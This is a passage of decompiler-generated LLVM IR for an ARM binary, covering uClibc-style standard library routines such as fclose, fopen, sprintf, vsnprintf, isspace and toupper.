  store i32 %v3_fb80, i32* %stack_var_-8, align 4
  %v3_fb84 = load i32, i32* @r2, align 4
  %v4_fb84 = call i32 @write(i32 %arg1, i32* %arg2, i32 %v3_fb84)
  store i32 %v4_fb84, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_fb84, -4095
  br i1 %tmp, label %dec_label_pc_fba4, label %dec_label_pc_fb94

dec_label_pc_fb94:                                ; preds = %entry
  %v0_fb94 = call i32 @__errno_location()
  %v0_fb98 = load i32, i32* %r4.global-to-local, align 4
  %v1_fb98 = sub i32 0, %v0_fb98
  %v2_fb9c = inttoptr i32 %v0_fb94 to i32*
  store i32 %v1_fb98, i32* %v2_fb9c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fba4

dec_label_pc_fba4:                                ; preds = %entry, %dec_label_pc_fb94
  %v0_fba4 = phi i32 [ %v4_fb84, %entry ], [ -1, %dec_label_pc_fb94 ]
  %v2_fba8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fba8, i32* @r4, align 4
  ret i32 %v0_fba4

; uselistorder directives
  uselistorder i32 %v4_fb84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fba4, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v2_fbb0 = load i32, i32* @global_var_237ac, align 4
  %v3_fbb4 = mul i32 %arg1, 2
  %v4_fbb4 = add i32 %v2_fbb0, %v3_fbb4
  %v5_fbb4 = inttoptr i32 %v4_fbb4 to i8*
  %v6_fbb4 = load i8, i8* %v5_fbb4, align 1
  %v8_fbb4 = zext i8 %v6_fbb4 to i32
  %v1_fbb8 = and i32 %v8_fbb4, 32
  ret i32 %v1_fbb8
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_fbcc = icmp slt i32 %arg1, 0
  br i1 %v1_fbcc, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_fbcc = mul i32 %arg1, 2
  %v2_fbd8 = load i32, i32* @global_var_237b4, align 4
  %v2_fbdc = add i32 %v2_fbd8, %v2_fbcc
  %v3_fbe0 = inttoptr i32 %v2_fbdc to i8*
  %v4_fbe0 = load i8, i8* %v3_fbe0, align 1
  %v6_fbe0 = zext i8 %v4_fbe0 to i32
  %v1_fbe4 = add i32 %v2_fbdc, 1
  %v2_fbe4 = inttoptr i32 %v1_fbe4 to i8*
  %v3_fbe4 = load i8, i8* %v2_fbe4, align 1
  %v4_fbe4 = zext i8 %v3_fbe4 to i32
  %v3_fbe8 = mul nuw i32 %v4_fbe4, 16777216
  %v4_fbec = sdiv i32 %v3_fbe8, 65536
  %v5_fbec = or i32 %v4_fbec, %v6_fbe0
  ret i32 %v5_fbec

; uselistorder directives
  uselistorder i32 %v2_fbdc, { 1, 0 }
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_29d80.589 to i32)
}

define i32 @__GI_fclose(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_fc04 = load i32, i32* @r4, align 4
  store i32 %v3_fc04, i32* %stack_var_-32, align 4
  %v6_fc04 = load i32, i32* @r5, align 4
  %v9_fc04 = load i32, i32* @r6, align 4
  %v12_fc04 = load i32, i32* @r7, align 4
  %v15_fc04 = load i32, i32* @r8, align 4
  %v2_fc08 = add i32 %tmp, 52
  %v3_fc08 = inttoptr i32 %v2_fc08 to i32*
  %v4_fc08 = load i32, i32* %v3_fc08, align 4
  store i32 %v4_fc08, i32* @r8, align 4
  %v2_fc0c = add i32 %tmp, 56
  store i32 %v2_fc0c, i32* @r5, align 4
  %v2_fc10 = ptrtoint i32* %stack_var_-64 to i32
  %v2_fc14 = icmp eq i32 %v4_fc08, 0
  store i1 %v2_fc14, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  %v2_fc24 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_fc24, i32* @r0, align 4
  br i1 %v2_fc14, label %dec_label_pc_fc2c, label %dec_label_pc_fc48

dec_label_pc_fc2c:                                ; preds = %entry
  store i32 79836, i32* %r3.global-to-local, align 4
  %v1_fc34 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_137d4.591 to i32), i32* %r3.global-to-local, align 4
  %v1_fc44 = call i32 @__pthread_return_0()
  %v0_fc48.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_fc48

dec_label_pc_fc48:                                ; preds = %entry, %dec_label_pc_fc2c
  %v0_fc50 = phi i32 [ %tmp, %entry ], [ %v0_fc48.pre, %dec_label_pc_fc2c ]
  %v1_fc48 = inttoptr i32 %v0_fc50 to i8*
  %v2_fc48 = load i8, i8* %v1_fc48, align 1
  %v3_fc48 = zext i8 %v2_fc48 to i32
  %v1_fc4c = and i32 %v3_fc48, 64
  store i32 %v1_fc4c, i32* %r3.global-to-local, align 4
  %v2_fc4c = icmp eq i32 %v1_fc4c, 0
  store i1 %v2_fc4c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_fc4c, i32* @r7, align 4
  br i1 %v2_fc4c, label %dec_label_pc_fc64, label %dec_label_pc_fc5c

dec_label_pc_fc5c:                                ; preds = %dec_label_pc_fc48
  %v3_fc5c = call i32 @fflush_unlocked(i8* %v1_fc48)
  store i32 %v3_fc5c, i32* @r7, align 4
  %v0_fc64.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_fc64

dec_label_pc_fc64:                                ; preds = %dec_label_pc_fc48, %dec_label_pc_fc5c
  %v0_fc64 = phi i32 [ %v0_fc50, %dec_label_pc_fc48 ], [ %v0_fc64.pre, %dec_label_pc_fc5c ]
  %v1_fc64 = add i32 %v0_fc64, 4
  %v2_fc64 = inttoptr i32 %v1_fc64 to i32*
  %v3_fc64 = load i32, i32* %v2_fc64, align 4
  %v1_fc68 = call i32 @__libc_close(i32 %v3_fc64)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_fc70 = icmp slt i32 %v1_fc68, 0
  %v2_fc70 = icmp eq i32 %v1_fc68, 0
  store i1 %v2_fc70, i1* %cpsr_z.global-to-local, align 1
  %v1_fc74 = load i32, i32* @r4, align 4
  %v2_fc74 = add i32 %v1_fc74, 4
  %v3_fc74 = inttoptr i32 %v2_fc74 to i32*
  store i32 -1, i32* %v3_fc74, align 4
  store i32 %v2_fc10, i32* @r0, align 4
  br i1 %v1_fc70, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_fc64
  %v3_fc88 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v3_fc88, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_fc64, %bb
  %v1_fc94 = call i32 @__pthread_return_void()
  %v1_fca0 = call i32 @__pthread_return_0()
  %v2_fca8 = load i32, i32* @global_var_27b4c.597, align 4
  %v1_fcac = add i32 %v2_fca8, 1
  store i32 %v1_fcac, i32* %r3.global-to-local, align 4
  store i32 %v1_fcac, i32* @global_var_27b4c.597, align 4
  store i32 %v2_fc10, i32* @r0, align 4
  %v1_fcc4 = call i32 @__pthread_return_void()
  %v0_fcc8 = load i32, i32* @r4, align 4
  %v1_fcc8 = inttoptr i32 %v0_fcc8 to i32*
  %v2_fcc8 = load i32, i32* %v1_fcc8, align 4
  %v1_fccc = and i32 %v2_fcc8, 24576
  store i32 %v1_fccc, i32* %r3.global-to-local, align 4
  %v3_fcd01 = udiv i32 %v1_fccc, 256
  %v1_fcd4 = trunc i32 %v3_fcd01 to i8
  %v3_fcd4 = add i32 %v0_fcc8, 1
  %v4_fcd4 = inttoptr i32 %v3_fcd4 to i8*
  store i8 %v1_fcd4, i8* %v4_fcd4, align 1
  %v0_fcd8 = load i32, i32* %r3.global-to-local, align 4
  %v1_fcd8 = trunc i32 %v0_fcd8 to i8
  %v2_fcd8 = load i32, i32* @r4, align 4
  %v3_fcd8 = inttoptr i32 %v2_fcd8 to i8*
  store i8 %v1_fcd8, i8* %v3_fcd8, align 1
  %v0_fcdc = load i32, i32* @r4, align 4
  %v1_fcdc = inttoptr i32 %v0_fcdc to i32*
  %v2_fcdc = load i32, i32* %v1_fcdc, align 4
  %v1_fce0 = or i32 %v2_fcdc, 48
  store i32 %v1_fce0, i32* %r3.global-to-local, align 4
  %v3_fce4 = sdiv i32 %v2_fcdc, 256
  %v0_fce8 = load i32, i32* @r8, align 4
  %v2_fce8 = icmp eq i32 %v0_fce8, 0
  store i1 %v2_fce8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_fc24, i32* @r0, align 4
  %v1_fcf8 = trunc i32 %v3_fce4 to i8
  %v3_fcf8 = add i32 %v0_fcdc, 1
  %v4_fcf8 = inttoptr i32 %v3_fcf8 to i8*
  store i8 %v1_fcf8, i8* %v4_fcf8, align 1
  %v0_fcfc = load i32, i32* %r3.global-to-local, align 4
  %v1_fcfc = trunc i32 %v0_fcfc to i8
  %v2_fcfc = load i32, i32* @r4, align 4
  %v3_fcfc = inttoptr i32 %v2_fcfc to i8*
  store i8 %v1_fcfc, i8* %v3_fcfc, align 1
  %v0_fd00 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fd00, label %bb16, label %.thread

bb16:                                             ; preds = %bb15
  %v2_fd04 = call i32 @__pthread_return_void()
  br label %.thread

.thread:                                          ; preds = %bb15, %bb16
  %v0_fd08 = load i32, i32* @r4, align 4
  %v1_fd08 = add i32 %v0_fd08, 1
  %v2_fd08 = inttoptr i32 %v1_fd08 to i8*
  %v3_fd08 = load i8, i8* %v2_fd08, align 1
  %v4_fd08 = zext i8 %v3_fd08 to i32
  store i32 %v4_fd08, i32* %r3.global-to-local, align 4
  %v1_fd0c = and i32 %v4_fd08, 64
  %v2_fd0c = icmp eq i32 %v1_fd0c, 0
  store i1 %v2_fd0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fd0c, label %bb18, label %bb17

bb17:                                             ; preds = %.thread
  br label %bb18

bb18:                                             ; preds = %.thread, %bb17
  %v1_fd14 = xor i1 %v2_fd0c, true
  call void @__pseudo_cond_branch(i1 %v1_fd14, i32 ptrtoint (i32* @global_var_12808.599 to i32))
  store i32 %v2_fc10, i32* @r0, align 4
  %v1_fd28 = call i32 @__pthread_return_void()
  %v1_fd34 = call i32 @__pthread_return_0()
  %v2_fd3c = load i32, i32* @global_var_27b50.602, align 4
  %v1_fd40 = add i32 %v2_fd3c, 1
  store i32 %v1_fd40, i32* %r3.global-to-local, align 4
  store i32 %v2_fc10, i32* @r0, align 4
  store i32 %v1_fd40, i32* @global_var_27b50.602, align 4
  %v1_fd54 = call i32 @__pthread_return_void()
  %v1_fd58 = call i32 @_stdio_openlist_dec_use(i32 %v1_fd54)
  %v0_fd5c = load i32, i32* @r7, align 4
  %v2_fd64 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_fd64, i32* @r4, align 4
  store i32 %v6_fc04, i32* @r5, align 4
  store i32 %v9_fc04, i32* @r6, align 4
  store i32 %v12_fc04, i32* @r7, align 4
  store i32 %v15_fc04, i32* @r8, align 4
  ret i32 %v0_fd5c

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_fc64, { 1, 0 }
  uselistorder label %dec_label_pc_fc48, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_fd8c = call i32 @_stdio_fopen()
  ret i32 %v0_fd8c
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_fd9c = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_fd9c, i32* @ip, align 4
  store i32 %v2_fd9c, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_fdb0 = call i32 @__GI_vsnprintf()
  ret i32 %v0_fdb0

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v3_fdc4 = load i32, i32* @r4, align 4
  %v6_fdc4 = load i32, i32* @r5, align 4
  %v12_fdc4 = load i32, i32* @r7, align 4
  %v15_fdc4 = load i32, i32* @r8, align 4
  %v18_fdc4 = load i32, i32* @sl, align 4
  %v0_fdc8 = load i32, i32* @r3, align 4
  store i32 %v0_fdc8, i32* @r8, align 4
  %v2_fdcc = ptrtoint i32* %stack_var_-108 to i32
  %v0_fdd4 = load i32, i32* @r0, align 4
  %v1_fdd4 = sub i32 -1, %v0_fdd4
  store i32 %v1_fdd4, i32* @r5, align 4
  store i32 %v0_fdd4, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v1_fde8 = load i32, i32* @r1, align 4
  %v3_fde8 = icmp ult i32 %v1_fdd4, %v1_fde8
  br i1 %v3_fde8, label %bb23, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_fde8, i32* @r5, align 4
  br label %bb23

bb23:                                             ; preds = %entry, %bb
  %v0_fdf0 = load i32, i32* @r2, align 4
  store i32 %v0_fdf0, i32* @r7, align 4
  %v2_fdf4 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_fdf4, i32* @r0, align 4
  store i32 208, i32* %stack_var_-108, align 4
  %v0_fe10 = call i32 @__stdio_init_mutex()
  %v0_fe14 = load i32, i32* @r4, align 4
  %v1_fe14 = load i32, i32* @r5, align 4
  %v2_fe14 = add i32 %v1_fe14, %v0_fe14
  %v0_fe1c = load i32, i32* @r7, align 4
  %v0_fe20 = load i32, i32* @r8, align 4
  %v0_fe2c = load i32, i32* @sl, align 4
  %v12_fe40 = inttoptr i32 %v0_fe1c to i8*
  %v13_fe40 = call i32 @_vfprintf_internal(i32 %v2_fdcc, i8* %v12_fe40, i32 %v0_fe20, i32 %v2_fe14, i32 %v0_fe14, i32 %v2_fe14, i32 %v0_fe14, i32 %v0_fe14, i32 %v0_fe14, i32 %v2_fe14, i32 %v0_fe2c)
  %v0_fe44 = load i32, i32* @r5, align 4
  %v1_fe44 = load i32, i32* @sl, align 4
  %v9_fe44 = icmp eq i32 %v0_fe44, %v1_fe44
  br i1 %v9_fe44, label %dec_label_pc_fe6c, label %dec_label_pc_fe50

dec_label_pc_fe50:                                ; preds = %bb23
  %v9_fe58 = icmp eq i32 %v1_fe14, 0
  %v1_fe5c = sext i1 %v9_fe58 to i32
  %v1_fe5c.v0_fe24 = add i32 %v0_fe14, %v1_fe5c
  %stack_var_-92.0 = inttoptr i32 %v1_fe5c.v0_fe24 to i8*
  %v1_fe68 = trunc i32 %v1_fe44 to i8
  store i8 %v1_fe68, i8* %stack_var_-92.0, align 1
  br label %dec_label_pc_fe6c

dec_label_pc_fe6c:                                ; preds = %bb23, %dec_label_pc_fe50
  store i32 %v3_fdc4, i32* @r4, align 4
  store i32 %v6_fdc4, i32* @r5, align 4
  store i32 %v12_fdc4, i32* @r7, align 4
  store i32 %v15_fdc4, i32* @r8, align 4
  store i32 %v18_fdc4, i32* @sl, align 4
  ret i32 %v13_fe40

; uselistorder directives
  uselistorder i32 %v1_fe14, { 1, 0 }
  uselistorder i32 %v0_fe14, { 0, 3, 4, 5, 2, 1 }
  uselistorder i32 %v1_fde8, { 1, 0 }
  uselistorder i32 %v0_fdd4, { 1, 0 }
  uselistorder label %dec_label_pc_fe6c, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_fe74 = load i32, i32* @r4, align 4
  store i32 %v3_fe74, i32* %stack_var_-24, align 4
  %v6_fe74 = load i32, i32* @r5, align 4
  %v9_fe74 = load i32, i32* @r6, align 4
  %v15_fe74 = load i32, i32* @r8, align 4
  %v0_fe78 = load i32, i32* @r1, align 4
  %v1_fe78 = inttoptr i32 %v0_fe78 to i8*
  %v2_fe78 = load i8, i8* %v1_fe78, align 1
  %v3_fe78 = zext i8 %v2_fe78 to i32
  store i32 %v3_fe78, i32* @ip, align 4
  %v7_fe7c = icmp eq i8 %v2_fe78, 114
  store i1 %v7_fe7c, i1* %cpsr_z.global-to-local, align 1
  %v2_fe80 = ptrtoint i32* %stack_var_-56 to i32
  %v0_fe84 = load i32, i32* @r0, align 4
  store i32 %v0_fe84, i32* @r6, align 4
  %v0_fe88 = load i32, i32* @r2, align 4
  store i32 %v0_fe88, i32* @r8, align 4
  %v0_fe8c = load i32, i32* @r3, align 4
  store i32 %v0_fe8c, i32* @r5, align 4
  br i1 %v7_fe7c, label %dec_label_pc_fed8, label %dec_label_pc_fe94

dec_label_pc_fe94:                                ; preds = %entry
  %v7_fe94 = icmp eq i8 %v2_fe78, 119
  store i1 %v7_fe94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe94, label %bb, label %dec_label_pc_fea0

bb:                                               ; preds = %dec_label_pc_fe94
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_fedc

dec_label_pc_fea0:                                ; preds = %dec_label_pc_fe94
  %v7_fea0 = icmp eq i8 %v2_fe78, 97
  store i1 %v7_fea0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fea0, label %bb30, label %dec_label_pc_feac

bb30:                                             ; preds = %dec_label_pc_fea0
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_fedc

dec_label_pc_feac:                                ; preds = %dec_label_pc_fea0, %dec_label_pc_ff64, %dec_label_pc_ff38
  %v0_feac = call i32 @__errno_location()
  store i32 %v0_feac, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_feb4 = load i32, i32* @r8, align 4
  %v2_feb4 = icmp eq i32 %v0_feb4, 0
  store i1 %v2_feb4, i1* %cpsr_z.global-to-local, align 1
  %v2_feb8 = inttoptr i32 %v0_feac to i32*
  store i32 22, i32* %v2_feb8, align 4
  br i1 %v2_feb4, label %dec_label_pc_1012c, label %dec_label_pc_fec0

dec_label_pc_fec0:                                ; preds = %dec_label_pc_ff88._crit_edge, %dec_label_pc_feac
  %v0_fec0 = load i32, i32* @r8, align 4
  %v1_fec0 = add i32 %v0_fec0, 1
  %v2_fec0 = inttoptr i32 %v1_fec0 to i8*
  %v3_fec0 = load i8, i8* %v2_fec0, align 1
  %v4_fec0 = zext i8 %v3_fec0 to i32
  store i32 %v4_fec0, i32* %r3.global-to-local, align 4
  %v1_fec4 = and i32 %v4_fec0, 32
  %v2_fec4 = icmp eq i32 %v1_fec4, 0
  store i1 %v2_fec4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fec4, label %dec_label_pc_1012c, label %dec_label_pc_fecc

dec_label_pc_fecc:                                ; preds = %dec_label_pc_fec0
  store i32 %v0_fec0, i32* @r0, align 4
  %v0_fed0 = call i32 @free()
  store i32 %v0_fed0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1012c

dec_label_pc_fed8:                                ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_fedc

dec_label_pc_fedc:                                ; preds = %bb, %bb30, %dec_label_pc_fed8
  %v1_fef4 = phi i32 [ 1089, %bb30 ], [ 577, %bb ], [ 1, %dec_label_pc_fed8 ]
  %v1_fedc = add i32 %v0_fe78, 1
  %v2_fedc = inttoptr i32 %v1_fedc to i8*
  %v3_fedc = load i8, i8* %v2_fedc, align 1
  %v7_fee0 = icmp eq i8 %v3_fedc, 98
  store i1 %v7_fee0, i1* %cpsr_z.global-to-local, align 1
  %v1_fedc.v0_fe78 = select i1 %v7_fee0, i32 %v1_fedc, i32 %v0_fe78
  store i32 %v1_fedc.v0_fe78, i32* %r3.global-to-local, align 4
  %v1_feec = add i32 %v1_fedc.v0_fe78, 1
  %v2_feec = inttoptr i32 %v1_feec to i8*
  %v3_feec = load i8, i8* %v2_feec, align 1
  %v4_feec = zext i8 %v3_feec to i32
  store i32 %v4_feec, i32* %r3.global-to-local, align 4
  %v7_fef0 = icmp eq i8 %v3_feec, 43
  store i1 %v7_fef0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fef0, label %bb33, label %.thread4

bb33:                                             ; preds = %dec_label_pc_fedc
  store i32 %v1_fef4, i32* %r3.global-to-local, align 4
  %v2_fef8 = add nuw nsw i32 %v1_fef4, 1
  store i32 %v2_fef8, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_fedc, %bb33
  %v2_fefc = icmp eq i32 %v0_fe88, 0
  store i1 %v2_fefc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fefc, label %dec_label_pc_ff04, label %dec_label_pc_ff30

dec_label_pc_ff04:                                ; preds = %.thread4
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_ff08 = call i32 @malloc(i32 80)
  store i32 %v1_ff08, i32* %r0.global-to-local, align 4
  store i32 %v1_ff08, i32* @r8, align 4
  %v3_ff0c = icmp eq i32 %v1_ff08, 0
  store i1 %v3_ff0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ff0c, label %dec_label_pc_10130, label %dec_label_pc_ff14

dec_label_pc_ff14:                                ; preds = %dec_label_pc_ff04
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v3_ff1c = add i32 %v1_ff08, 1
  %v4_ff1c = inttoptr i32 %v3_ff1c to i8*
  store i8 32, i8* %v4_ff1c, align 1
  %v0_ff20 = load i32, i32* %r2.global-to-local, align 4
  %v1_ff20 = load i32, i32* @r8, align 4
  %v2_ff20 = add i32 %v1_ff20, 8
  %v3_ff20 = inttoptr i32 %v2_ff20 to i32*
  store i32 %v0_ff20, i32* %v3_ff20, align 4
  %v0_ff24 = load i32, i32* %r2.global-to-local, align 4
  %v1_ff24 = trunc i32 %v0_ff24 to i8
  %v2_ff24 = load i32, i32* @r8, align 4
  %v3_ff24 = inttoptr i32 %v2_ff24 to i8*
  store i8 %v1_ff24, i8* %v3_ff24, align 1
  %v0_ff28 = load i32, i32* @r8, align 4
  %v1_ff28 = add i32 %v0_ff28, 56
  store i32 %v1_ff28, i32* @r0, align 4
  %v0_ff2c = call i32 @__stdio_init_mutex()
  store i32 %v0_ff2c, i32* %r0.global-to-local, align 4
  %v0_ff30.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_ff30

dec_label_pc_ff30:                                ; preds = %.thread4, %dec_label_pc_ff14
  %v0_ff88 = phi i32 [ %v0_fe8c, %.thread4 ], [ %v0_ff30.pre, %dec_label_pc_ff14 ]
  %v1_ff30 = icmp slt i32 %v0_ff88, 0
  %v2_ff30 = icmp eq i32 %v0_ff88, 0
  store i1 %v2_ff30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_ff30, label %dec_label_pc_ff88, label %dec_label_pc_ff38

dec_label_pc_ff38:                                ; preds = %dec_label_pc_ff30
  %v0_ff3c = load i32, i32* @r4, align 4
  %v2_ff3c = and i32 %v0_ff3c, 131075
  %v1_ff40 = add nuw nsw i32 %v2_ff3c, 1
  store i32 %v1_ff40, i32* %r2.global-to-local, align 4
  %v0_ff44 = load i32, i32* @r6, align 4
  %v1_ff44 = add i32 %v0_ff44, 1
  %v2_ff48 = and i32 %v1_ff44, %v1_ff40
  store i32 %v2_ff48, i32* %r3.global-to-local, align 4
  %v9_ff4c = icmp eq i32 %v2_ff48, %v1_ff40
  store i1 %v9_ff4c, i1* %cpsr_z.global-to-local, align 1
  %v1_ff50 = load i32, i32* @r8, align 4
  %v2_ff50 = add i32 %v1_ff50, 4
  %v3_ff50 = inttoptr i32 %v2_ff50 to i32*
  store i32 %v0_ff88, i32* %v3_ff50, align 4
  br i1 %v9_ff4c, label %dec_label_pc_ff58, label %dec_label_pc_feac

dec_label_pc_ff58:                                ; preds = %dec_label_pc_ff38
  %v0_ff58 = load i32, i32* @r4, align 4
  %v1_ff58 = load i32, i32* @r6, align 4
  %v2_ff58 = sub i32 -1, %v1_ff58
  %v3_ff58 = and i32 %v0_ff58, %v2_ff58
  store i32 %v3_ff58, i32* %r3.global-to-local, align 4
  %v1_ff5c = and i32 %v3_ff58, 1024
  %v2_ff5c = icmp eq i32 %v1_ff5c, 0
  store i1 %v2_ff5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ff5c, label %dec_label_pc_ff7c, label %dec_label_pc_ff64

dec_label_pc_ff64:                                ; preds = %dec_label_pc_ff58
  %v0_ff64 = load i32, i32* @r5, align 4
  store i32 %v0_ff64, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_ff70 = call i32 @__libc_fcntl(i32 %v0_ff64, i32 4)
  store i32 %v2_ff70, i32* %r0.global-to-local, align 4
  %v2_ff74 = icmp eq i32 %v2_ff70, 0
  store i1 %v2_ff74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ff74, label %dec_label_pc_ff64.dec_label_pc_ff7c_crit_edge, label %dec_label_pc_feac

dec_label_pc_ff64.dec_label_pc_ff7c_crit_edge:    ; preds = %dec_label_pc_ff64
  %v0_ff7c.pre = load i32, i32* @r6, align 4
  %v0_ff80.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ff7c

dec_label_pc_ff7c:                                ; preds = %dec_label_pc_ff64.dec_label_pc_ff7c_crit_edge, %dec_label_pc_ff58
  %v0_ff80 = phi i32 [ %v0_ff80.pre, %dec_label_pc_ff64.dec_label_pc_ff7c_crit_edge ], [ %v0_ff58, %dec_label_pc_ff58 ]
  %v0_ff7c = phi i32 [ %v0_ff7c.pre, %dec_label_pc_ff64.dec_label_pc_ff7c_crit_edge ], [ %v1_ff58, %dec_label_pc_ff58 ]
  %v1_ff7c = and i32 %v0_ff7c, 131072
  store i32 %v1_ff7c, i32* %r3.global-to-local, align 4
  %v2_ff80 = or i32 %v1_ff7c, %v0_ff80
  store i32 %v2_ff80, i32* @r4, align 4
  br label %dec_label_pc_ffac

dec_label_pc_ff88:                                ; preds = %dec_label_pc_ff30
  %v7_ff88 = icmp eq i32 %v0_ff88, -1
  store i1 %v7_ff88, i1* %cpsr_z.global-to-local, align 1
  %v0_ff94.pre = load i32, i32* @r4, align 4
  br i1 %v7_ff88, label %dec_label_pc_ff88._crit_edge, label %bb34

bb34:                                             ; preds = %dec_label_pc_ff88
  %v2_ff8c = or i32 %v0_ff94.pre, 131072
  store i32 %v2_ff8c, i32* @r4, align 4
  br label %dec_label_pc_ff88._crit_edge

dec_label_pc_ff88._crit_edge:                     ; preds = %dec_label_pc_ff88, %bb34
  %v0_ff94 = phi i32 [ %v2_ff8c, %bb34 ], [ %v0_ff94.pre, %dec_label_pc_ff88 ]
  %v0_ff90 = load i32, i32* @r6, align 4
  store i32 %v0_ff90, i32* %r0.global-to-local, align 4
  store i32 %v0_ff94, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_ff9c = inttoptr i32 %v0_ff90 to i8*
  %v3_ff9c = call i32 @__libc_open(i8* %v2_ff9c, i32 %v0_ff94)
  store i32 %v3_ff9c, i32* %r0.global-to-local, align 4
  %v1_ffa0 = icmp slt i32 %v3_ff9c, 0
  %v2_ffa0 = icmp eq i32 %v3_ff9c, 0
  store i1 %v2_ffa0, i1* %cpsr_z.global-to-local, align 1
  %v1_ffa4 = load i32, i32* @r8, align 4
  %v2_ffa4 = add i32 %v1_ffa4, 4
  %v3_ffa4 = inttoptr i32 %v2_ffa4 to i32*
  store i32 %v3_ff9c, i32* %v3_ffa4, align 4
  br i1 %v1_ffa0, label %dec_label_pc_fec0, label %dec_label_pc_ffac

dec_label_pc_ffac:                                ; preds = %dec_label_pc_ff88._crit_edge, %dec_label_pc_ff7c
  %v0_ffac = load i32, i32* @r8, align 4
  %v1_ffac = inttoptr i32 %v0_ffac to i32*
  %v2_ffac = load i32, i32* %v1_ffac, align 4
  %v1_ffb0 = and i32 %v2_ffac, 8192
  store i32 %v1_ffb0, i32* %r3.global-to-local, align 4
  %v3_ffb41 = udiv i32 %v1_ffb0, 256
  store i32 %v3_ffb41, i32* %r2.global-to-local, align 4
  %v1_ffb8 = trunc i32 %v3_ffb41 to i8
  %v3_ffb8 = add i32 %v0_ffac, 1
  %v4_ffb8 = inttoptr i32 %v3_ffb8 to i8*
  store i8 %v1_ffb8, i8* %v4_ffb8, align 1
  %v0_ffbc = load i32, i32* %r3.global-to-local, align 4
  %v1_ffbc = trunc i32 %v0_ffbc to i8
  %v2_ffbc = load i32, i32* @r8, align 4
  %v3_ffbc = inttoptr i32 %v2_ffbc to i8*
  store i8 %v1_ffbc, i8* %v3_ffbc, align 1
  %v0_ffc0 = load i32, i32* @r4, align 4
  %v1_ffc0 = and i32 %v0_ffc0, 131072
  store i32 %v1_ffc0, i32* %r1.global-to-local, align 4
